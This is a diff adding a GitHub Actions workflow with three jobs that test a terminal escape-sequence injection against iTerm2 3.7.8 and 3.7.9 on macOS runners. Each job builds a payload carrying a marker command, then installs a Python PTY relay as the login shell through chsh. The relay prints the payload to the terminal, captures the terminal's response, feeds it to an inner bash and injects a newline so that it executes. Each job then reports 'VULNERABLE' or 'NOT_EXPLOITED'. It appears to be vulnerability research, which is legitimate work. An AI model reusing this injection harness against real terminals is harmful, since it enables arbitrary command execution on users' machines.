@@ -1,0 +1,725 @@
+name: macos-verify4
+
+on:
+  push:
+    branches: [main]
+    paths:
+      - '.github/workflows/macos-verify4.yml'
+      - 'tools/**'
+  workflow_dispatch:
+
+jobs:
+  relay-378:
+    runs-on: macos-latest
+    timeout-minutes: 25
+    env:
+      ITERM_VER: "3_7_8"
+      MODE: "newline"
+      MARKER: "PWNED_RELAY_378"
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Environment
+        run: |
+          sw_vers
+          uname -m
+          echo "user=$USER home=$HOME"
+          python3 --version
+          which python3
+
+      - name: Download and install iTerm2
+        run: |
+          set -eux
+          curl -L --max-time 600 -o /tmp/i.zip "https://iterm2.com/downloads/stable/iTerm2-${ITERM_VER}.zip"
+          mkdir -p /tmp/i
+          unzip -q /tmp/i.zip -d /tmp/i
+          xattr -dr com.apple.quarantine /tmp/i/iTerm.app || true
+          /usr/libexec/PlistBuddy -c "Print :CFBundleShortVersionString" /tmp/i/iTerm.app/Contents/Info.plist
+          sudo rm -rf /Applications/iTerm.app
+          sudo cp -R /tmp/i/iTerm.app /Applications/
+          defaults write com.googlecode.iterm2 SUHasLaunchedBefore -bool true
+          defaults write com.googlecode.iterm2 NoSyncSuppressRestoreMessage -bool true
+          defaults write com.googlecode.iterm2 NoSyncDoNotAskAboutEmptySessions -bool true
+          defaults write com.googlecode.iterm2 PromptOnQuit -bool false
+
+      - name: Build payload
+        run: |
+          set -eux
+          echo "PWNED_RELAY_378" > /tmp/marker_name
+          python3 tools/make_payload.py --mode "$MODE" --cmd "touch $HOME/$MARKER" --out /tmp/payload.md
+          od -c /tmp/payload.md | head -8
+
+      - name: Install relay as login shell
+        run: |
+          set -eux
+          cat > /tmp/lsh.py <<'RELAYEOF'
+          #!/usr/bin/env python3
+          import os, pty, select, sys, time, fcntl, traceback
+
+          LOG = "/tmp/lsh.log"
+
+          def log(m):
+              try:
+                  with open(LOG, "a") as f:
+                      f.write(str(m) + "\n")
+              except Exception:
+                  pass
+
+          def main():
+              log("=== relay started ===")
+              log("pid=%d uid=%d tty=%s" % (os.getpid(), os.getuid(), os.ttyname(0) if os.isatty(0) else "NOT_A_TTY"))
+
+              # 等 iTerm2 准备好
+              time.sleep(2)
+
+              # 把诱饵吐到自己的 stdout（iTerm2 会解析 APC）
+              try:
+                  with open("/tmp/payload.md", "rb") as f:
+                      payload = f.read()
+                  os.write(1, payload)
+                  log("payload written to tty output: %d bytes" % len(payload))
+              except Exception as e:
+                  log("payload read failed: %r" % (e,))
+
+              # 给 iTerm2 时间把响应写进我们的输入队列
+              time.sleep(3)
+
+              # 起内层 PTY + 真 bash
+              pid, fd = pty.fork()
+              if pid == 0:
+                  # 子进程：变成真 bash
+                  try:
+                      os.execv("/bin/bash", ["/bin/bash", "-l"])
+                  except Exception:
+                      os._exit(1)
+              log("inner bash forked, master_fd=%d" % fd)
+
+              # 我们的 stdin 设成非阻塞，方便轮询
+              try:
+                  fl = fcntl.fcntl(0, fcntl.F_GETFL)
+                  fcntl.fcntl(0, fcntl.F_SETFL, fl | os.O_NONBLOCK)
+              except Exception as e:
+                  log("fcntl failed: %r" % (e,))
+
+              start = time.time()
+              nl_sent = False
+              captured = b""
+
+              while True:
+                  try:
+                      r, _, _ = select.select([0, fd], [], [], 0.3)
+                  except Exception as e:
+                      log("select failed: %r" % (e,))
+                      break
+
+                  for f in r:
+                      try:
+                          d = os.read(f, 65536)
+                      except OSError:
+                          d = b""
+                      if not d:
+                          continue
+                      if f == 0:
+                          # 来自 iTerm2 的 tty 输入 = kitty 响应
+                          captured += d
+                          try:
+                              with open("/tmp/captured.bin", "ab") as c:
+                                  c.write(d)
+                          except Exception:
+                              pass
+                          os.write(fd, d)
+                      else:
+                          # bash 的输出 → 转发到 iTerm2
+                          os.write(1, d)
+
+                  # bash 起来 4 秒后补一个换行，等价于用户按回车
+                  if not nl_sent and time.time() - start > 4:
+                      try:
+                          os.write(fd, b"\n")
+                          nl_sent = True
+                          log("injected newline into inner pty")
+                      except Exception as e:
+                          log("newline inject failed: %r" % (e,))
+
+                  if time.time() - start > 30:
+                      log("relay timeout, exiting loop")
+                      break
+
+              # 收尾：把抓到的响应存成 hex
+              try:
+                  if captured:
+                      with open("/tmp/captured.hex", "w") as h:
+                          h.write(captured.hex())
+                      log("captured %d bytes from tty input" % len(captured))
+                  else:
+                      log("captured 0 bytes")
+              except Exception:
+                  pass
+
+              # 检查 marker
+              try:
+                  name = open("/tmp/marker_name").read().strip()
+                  marker = os.path.join(os.path.expanduser("~"), name)
+                  if os.path.exists(marker):
+                      log("MARKER_PRESENT: " + marker)
+                  else:
+                      log("MARKER_ABSENT: " + marker)
+              except Exception as e:
+                  log("marker check failed: %r" % (e,))
+
+              # 让会话继续活着，别让 tab 关掉
+              time.sleep(20)
+
+          if __name__ == "__main__":
+              try:
+                  main()
+              except Exception:
+                  log("FATAL:\n" + traceback.format_exc())
+
+          RELAYEOF
+          chmod +x /tmp/lsh.py
+          # python3 在 runner 上的真实路径写进 shebang 更保险
+          PY=$(which python3)
+          sed -i '' "1s|.*|#!$PY|" /tmp/lsh.py || true
+          head -3 /tmp/lsh.py
+          sudo chmod 755 /tmp/lsh.py
+          if ! grep -qx /tmp/lsh.py /etc/shells 2>/dev/null; then
+            echo /tmp/lsh.py | sudo tee -a /etc/shells
+          fi
+          sudo chsh -s /tmp/lsh.py "$USER"
+          dscl . -read /Users/$USER UserShell
+
+      - name: Clean
+        run: rm -f "$HOME/$MARKER" /tmp/lsh.log /tmp/captured.bin /tmp/captured.hex
+
+      - name: Launch iTerm2
+        run: |
+          open -a /Applications/iTerm.app
+          sleep 35
+          pgrep -l iTerm || echo ITERM_NOT_RUNNING
+
+      - name: Wait
+        run: |
+          for i in $(seq 1 20); do
+            sleep 5
+            if [ -f "$HOME/$MARKER" ]; then echo "marker after $((i*5))s"; break; fi
+          done
+
+      - name: Report
+        if: always()
+        run: |
+          echo "=============== REPORT relay-378 ==============="
+          echo "--- lsh.log ---"
+          cat /tmp/lsh.log 2>/dev/null || echo "(no log)"
+          echo ""
+          echo "--- captured.hex ---"
+          if [ -f /tmp/captured.hex ]; then
+            echo "HEX: $(cat /tmp/captured.hex | head -c 2000)"
+            echo ""
+            echo "BYTES: $(wc -c < /tmp/captured.bin)"
+            echo "--- cat -v ---"
+            cat -v /tmp/captured.bin | head -10
+          else
+            echo "NO_CAPTURE"
+          fi
+          echo ""
+          echo "--- marker ---"
+          if [ -f "$HOME/$MARKER" ]; then
+            echo "[RESULT] VULNERABLE"
+            ls -la "$HOME/$MARKER"
+          else
+            echo "[RESULT] NOT_EXPLOITED"
+          fi
+
+      - name: Screenshot
+        if: always()
+        run: screencapture -x /tmp/shot.png 2>/dev/null || true
+
+      - name: Upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ev4-relay-378
+          path: |
+            /tmp/payload.md
+            /tmp/lsh.log
+            /tmp/captured.bin
+            /tmp/captured.hex
+            /tmp/shot.png
+          if-no-files-found: warn
+  relay-379-nl:
+    runs-on: macos-latest
+    timeout-minutes: 25
+    env:
+      ITERM_VER: "3_7_9"
+      MODE: "newline"
+      MARKER: "PWNED_RELAY_379NL"
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Environment
+        run: |
+          sw_vers
+          uname -m
+          echo "user=$USER home=$HOME"
+          python3 --version
+          which python3
+
+      - name: Download and install iTerm2
+        run: |
+          set -eux
+          curl -L --max-time 600 -o /tmp/i.zip "https://iterm2.com/downloads/stable/iTerm2-${ITERM_VER}.zip"
+          mkdir -p /tmp/i
+          unzip -q /tmp/i.zip -d /tmp/i
+          xattr -dr com.apple.quarantine /tmp/i/iTerm.app || true
+          /usr/libexec/PlistBuddy -c "Print :CFBundleShortVersionString" /tmp/i/iTerm.app/Contents/Info.plist
+          sudo rm -rf /Applications/iTerm.app
+          sudo cp -R /tmp/i/iTerm.app /Applications/
+          defaults write com.googlecode.iterm2 SUHasLaunchedBefore -bool true
+          defaults write com.googlecode.iterm2 NoSyncSuppressRestoreMessage -bool true
+          defaults write com.googlecode.iterm2 NoSyncDoNotAskAboutEmptySessions -bool true
+          defaults write com.googlecode.iterm2 PromptOnQuit -bool false
+
+      - name: Build payload
+        run: |
+          set -eux
+          echo "PWNED_RELAY_379NL" > /tmp/marker_name
+          python3 tools/make_payload.py --mode "$MODE" --cmd "touch $HOME/$MARKER" --out /tmp/payload.md
+          od -c /tmp/payload.md | head -8
+
+      - name: Install relay as login shell
+        run: |
+          set -eux
+          cat > /tmp/lsh.py <<'RELAYEOF'
+          #!/usr/bin/env python3
+          import os, pty, select, sys, time, fcntl, traceback
+
+          LOG = "/tmp/lsh.log"
+
+          def log(m):
+              try:
+                  with open(LOG, "a") as f:
+                      f.write(str(m) + "\n")
+              except Exception:
+                  pass
+
+          def main():
+              log("=== relay started ===")
+              log("pid=%d uid=%d tty=%s" % (os.getpid(), os.getuid(), os.ttyname(0) if os.isatty(0) else "NOT_A_TTY"))
+
+              # 等 iTerm2 准备好
+              time.sleep(2)
+
+              # 把诱饵吐到自己的 stdout（iTerm2 会解析 APC）
+              try:
+                  with open("/tmp/payload.md", "rb") as f:
+                      payload = f.read()
+                  os.write(1, payload)
+                  log("payload written to tty output: %d bytes" % len(payload))
+              except Exception as e:
+                  log("payload read failed: %r" % (e,))
+
+              # 给 iTerm2 时间把响应写进我们的输入队列
+              time.sleep(3)
+
+              # 起内层 PTY + 真 bash
+              pid, fd = pty.fork()
+              if pid == 0:
+                  # 子进程：变成真 bash
+                  try:
+                      os.execv("/bin/bash", ["/bin/bash", "-l"])
+                  except Exception:
+                      os._exit(1)
+              log("inner bash forked, master_fd=%d" % fd)
+
+              # 我们的 stdin 设成非阻塞，方便轮询
+              try:
+                  fl = fcntl.fcntl(0, fcntl.F_GETFL)
+                  fcntl.fcntl(0, fcntl.F_SETFL, fl | os.O_NONBLOCK)
+              except Exception as e:
+                  log("fcntl failed: %r" % (e,))
+
+              start = time.time()
+              nl_sent = False
+              captured = b""
+
+              while True:
+                  try:
+                      r, _, _ = select.select([0, fd], [], [], 0.3)
+                  except Exception as e:
+                      log("select failed: %r" % (e,))
+                      break
+
+                  for f in r:
+                      try:
+                          d = os.read(f, 65536)
+                      except OSError:
+                          d = b""
+                      if not d:
+                          continue
+                      if f == 0:
+                          # 来自 iTerm2 的 tty 输入 = kitty 响应
+                          captured += d
+                          try:
+                              with open("/tmp/captured.bin", "ab") as c:
+                                  c.write(d)
+                          except Exception:
+                              pass
+                          os.write(fd, d)
+                      else:
+                          # bash 的输出 → 转发到 iTerm2
+                          os.write(1, d)
+
+                  # bash 起来 4 秒后补一个换行，等价于用户按回车
+                  if not nl_sent and time.time() - start > 4:
+                      try:
+                          os.write(fd, b"\n")
+                          nl_sent = True
+                          log("injected newline into inner pty")
+                      except Exception as e:
+                          log("newline inject failed: %r" % (e,))
+
+                  if time.time() - start > 30:
+                      log("relay timeout, exiting loop")
+                      break
+
+              # 收尾：把抓到的响应存成 hex
+              try:
+                  if captured:
+                      with open("/tmp/captured.hex", "w") as h:
+                          h.write(captured.hex())
+                      log("captured %d bytes from tty input" % len(captured))
+                  else:
+                      log("captured 0 bytes")
+              except Exception:
+                  pass
+
+              # 检查 marker
+              try:
+                  name = open("/tmp/marker_name").read().strip()
+                  marker = os.path.join(os.path.expanduser("~"), name)
+                  if os.path.exists(marker):
+                      log("MARKER_PRESENT: " + marker)
+                  else:
+                      log("MARKER_ABSENT: " + marker)
+              except Exception as e:
+                  log("marker check failed: %r" % (e,))
+
+              # 让会话继续活着，别让 tab 关掉
+              time.sleep(20)
+
+          if __name__ == "__main__":
+              try:
+                  main()
+              except Exception:
+                  log("FATAL:\n" + traceback.format_exc())
+
+          RELAYEOF
+          chmod +x /tmp/lsh.py
+          # python3 在 runner 上的真实路径写进 shebang 更保险
+          PY=$(which python3)
+          sed -i '' "1s|.*|#!$PY|" /tmp/lsh.py || true
+          head -3 /tmp/lsh.py
+          sudo chmod 755 /tmp/lsh.py
+          if ! grep -qx /tmp/lsh.py /etc/shells 2>/dev/null; then
+            echo /tmp/lsh.py | sudo tee -a /etc/shells
+          fi
+          sudo chsh -s /tmp/lsh.py "$USER"
+          dscl . -read /Users/$USER UserShell
+
+      - name: Clean
+        run: rm -f "$HOME/$MARKER" /tmp/lsh.log /tmp/captured.bin /tmp/captured.hex
+
+      - name: Launch iTerm2
+        run: |
+          open -a /Applications/iTerm.app
+          sleep 35
+          pgrep -l iTerm || echo ITERM_NOT_RUNNING
+
+      - name: Wait
+        run: |
+          for i in $(seq 1 20); do
+            sleep 5
+            if [ -f "$HOME/$MARKER" ]; then echo "marker after $((i*5))s"; break; fi
+          done
+
+      - name: Report
+        if: always()
+        run: |
+          echo "=============== REPORT relay-379-nl ==============="
+          echo "--- lsh.log ---"
+          cat /tmp/lsh.log 2>/dev/null || echo "(no log)"
+          echo ""
+          echo "--- captured.hex ---"
+          if [ -f /tmp/captured.hex ]; then
+            echo "HEX: $(cat /tmp/captured.hex | head -c 2000)"
+            echo ""
+            echo "BYTES: $(wc -c < /tmp/captured.bin)"
+            echo "--- cat -v ---"
+            cat -v /tmp/captured.bin | head -10
+          else
+            echo "NO_CAPTURE"
+          fi
+          echo ""
+          echo "--- marker ---"
+          if [ -f "$HOME/$MARKER" ]; then
+            echo "[RESULT] VULNERABLE"
+            ls -la "$HOME/$MARKER"
+          else
+            echo "[RESULT] NOT_EXPLOITED"
+          fi
+
+      - name: Screenshot
+        if: always()
+        run: screencapture -x /tmp/shot.png 2>/dev/null || true
+
+      - name: Upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ev4-relay-379-nl
+          path: |
+            /tmp/payload.md
+            /tmp/lsh.log
+            /tmp/captured.bin
+            /tmp/captured.hex
+            /tmp/shot.png
+          if-no-files-found: warn
+  relay-379-semi:
+    runs-on: macos-latest
+    timeout-minutes: 25
+    env:
+      ITERM_VER: "3_7_9"
+      MODE: "semicolon"
+      MARKER: "PWNED_RELAY_379S"
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Environment
+        run: |
+          sw_vers
+          uname -m
+          echo "user=$USER home=$HOME"
+          python3 --version
+          which python3
+
+      - name: Download and install iTerm2
+        run: |
+          set -eux
+          curl -L --max-time 600 -o /tmp/i.zip "https://iterm2.com/downloads/stable/iTerm2-${ITERM_VER}.zip"
+          mkdir -p /tmp/i
+          unzip -q /tmp/i.zip -d /tmp/i
+          xattr -dr com.apple.quarantine /tmp/i/iTerm.app || true
+          /usr/libexec/PlistBuddy -c "Print :CFBundleShortVersionString" /tmp/i/iTerm.app/Contents/Info.plist
+          sudo rm -rf /Applications/iTerm.app
+          sudo cp -R /tmp/i/iTerm.app /Applications/
+          defaults write com.googlecode.iterm2 SUHasLaunchedBefore -bool true
+          defaults write com.googlecode.iterm2 NoSyncSuppressRestoreMessage -bool true
+          defaults write com.googlecode.iterm2 NoSyncDoNotAskAboutEmptySessions -bool true
+          defaults write com.googlecode.iterm2 PromptOnQuit -bool false
+
+      - name: Build payload
+        run: |
+          set -eux
+          echo "PWNED_RELAY_379S" > /tmp/marker_name
+          python3 tools/make_payload.py --mode "$MODE" --cmd "touch $HOME/$MARKER" --out /tmp/payload.md
+          od -c /tmp/payload.md | head -8
+
+      - name: Install relay as login shell
+        run: |
+          set -eux
+          cat > /tmp/lsh.py <<'RELAYEOF'
+          #!/usr/bin/env python3
+          import os, pty, select, sys, time, fcntl, traceback
+
+          LOG = "/tmp/lsh.log"
+
+          def log(m):
+              try:
+                  with open(LOG, "a") as f:
+                      f.write(str(m) + "\n")
+              except Exception:
+                  pass
+
+          def main():
+              log("=== relay started ===")
+              log("pid=%d uid=%d tty=%s" % (os.getpid(), os.getuid(), os.ttyname(0) if os.isatty(0) else "NOT_A_TTY"))
+
+              # 等 iTerm2 准备好
+              time.sleep(2)
+
+              # 把诱饵吐到自己的 stdout（iTerm2 会解析 APC）
+              try:
+                  with open("/tmp/payload.md", "rb") as f:
+                      payload = f.read()
+                  os.write(1, payload)
+                  log("payload written to tty output: %d bytes" % len(payload))
+              except Exception as e:
+                  log("payload read failed: %r" % (e,))
+
+              # 给 iTerm2 时间把响应写进我们的输入队列
+              time.sleep(3)
+
+              # 起内层 PTY + 真 bash
+              pid, fd = pty.fork()
+              if pid == 0:
+                  # 子进程：变成真 bash
+                  try:
+                      os.execv("/bin/bash", ["/bin/bash", "-l"])
+                  except Exception:
+                      os._exit(1)
+              log("inner bash forked, master_fd=%d" % fd)
+
+              # 我们的 stdin 设成非阻塞，方便轮询
+              try:
+                  fl = fcntl.fcntl(0, fcntl.F_GETFL)
+                  fcntl.fcntl(0, fcntl.F_SETFL, fl | os.O_NONBLOCK)
+              except Exception as e:
+                  log("fcntl failed: %r" % (e,))
+
+              start = time.time()
+              nl_sent = False
+              captured = b""
+
+              while True:
+                  try:
+                      r, _, _ = select.select([0, fd], [], [], 0.3)
+                  except Exception as e:
+                      log("select failed: %r" % (e,))
+                      break
+
+                  for f in r:
+                      try:
+                          d = os.read(f, 65536)
+                      except OSError:
+                          d = b""
+                      if not d:
+                          continue
+                      if f == 0:
+                          # 来自 iTerm2 的 tty 输入 = kitty 响应
+                          captured += d
+                          try:
+                              with open("/tmp/captured.bin", "ab") as c:
+                                  c.write(d)
+                          except Exception:
+                              pass
+                          os.write(fd, d)
+                      else:
+                          # bash 的输出 → 转发到 iTerm2
+                          os.write(1, d)
+
+                  # bash 起来 4 秒后补一个换行，等价于用户按回车
+                  if not nl_sent and time.time() - start > 4:
+                      try:
+                          os.write(fd, b"\n")
+                          nl_sent = True
+                          log("injected newline into inner pty")
+                      except Exception as e:
+                          log("newline inject failed: %r" % (e,))
+
+                  if time.time() - start > 30:
+                      log("relay timeout, exiting loop")
+                      break
+
+              # 收尾：把抓到的响应存成 hex
+              try:
+                  if captured:
+                      with open("/tmp/captured.hex", "w") as h:
+                          h.write(captured.hex())
+                      log("captured %d bytes from tty input" % len(captured))
+                  else:
+                      log("captured 0 bytes")
+              except Exception:
+                  pass
+
+              # 检查 marker
+              try:
+                  name = open("/tmp/marker_name").read().strip()
+                  marker = os.path.join(os.path.expanduser("~"), name)
+                  if os.path.exists(marker):
+                      log("MARKER_PRESENT: " + marker)
+                  else:
+                      log("MARKER_ABSENT: " + marker)
+              except Exception as e:
+                  log("marker check failed: %r" % (e,))
+
+              # 让会话继续活着，别让 tab 关掉
+              time.sleep(20)
+
+          if __name__ == "__main__":
+              try:
+                  main()
+              except Exception:
+                  log("FATAL:\n" + traceback.format_exc())
+
+          RELAYEOF
+          chmod +x /tmp/lsh.py
+          # python3 在 runner 上的真实路径写进 shebang 更保险
+          PY=$(which python3)
+          sed -i '' "1s|.*|#!$PY|" /tmp/lsh.py || true
+          head -3 /tmp/lsh.py
+          sudo chmod 755 /tmp/lsh.py
+          if ! grep -qx /tmp/lsh.py /etc/shells 2>/dev/null; then
+            echo /tmp/lsh.py | sudo tee -a /etc/shells
+          fi
+          sudo chsh -s /tmp/lsh.py "$USER"
+          dscl . -read /Users/$USER UserShell
+
+      - name: Clean
+        run: rm -f "$HOME/$MARKER" /tmp/lsh.log /tmp/captured.bin /tmp/captured.hex
+
+      - name: Launch iTerm2
+        run: |
+          open -a /Applications/iTerm.app
+          sleep 35
+          pgrep -l iTerm || echo ITERM_NOT_RUNNING
+
+      - name: Wait
+        run: |
+          for i in $(seq 1 20); do
+            sleep 5
+            if [ -f "$HOME/$MARKER" ]; then echo "marker after $((i*5))s"; break; fi
+          done
+
+      - name: Report
+        if: always()
+        run: |
+          echo "=============== REPORT relay-379-semi ==============="
+          echo "--- lsh.log ---"
+          cat /tmp/lsh.log 2>/dev/null || echo "(no log)"
+          echo ""
+          echo "--- captured.hex ---"
+          if [ -f /tmp/captured.hex ]; then
+            echo "HEX: $(cat /tmp/captured.hex | head -c 2000)"
+            echo ""
+            echo "BYTES: $(wc -c < /tmp/captured.bin)"
+            echo "--- cat -v ---"
+            cat -v /tmp/captured.bin | head -10
+          else
+            echo "NO_CAPTURE"
+          fi
+          echo ""
+          echo "--- marker ---"
+          if [ -f "$HOME/$MARKER" ]; then
+            echo "[RESULT] VULNERABLE"
+            ls -la "$HOME/$MARKER"
+          else
+            echo "[RESULT] NOT_EXPLOITED"
+          fi
+
+      - name: Screenshot
+        if: always()
+        run: screencapture -x /tmp/shot.png 2>/dev/null || true
+
+      - name: Upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ev4-relay-379-semi
+          path: |
+            /tmp/payload.md
+            /tmp/lsh.log
+            /tmp/captured.bin
+            /tmp/captured.hex
+            /tmp/shot.png
+          if-no-files-found: warn
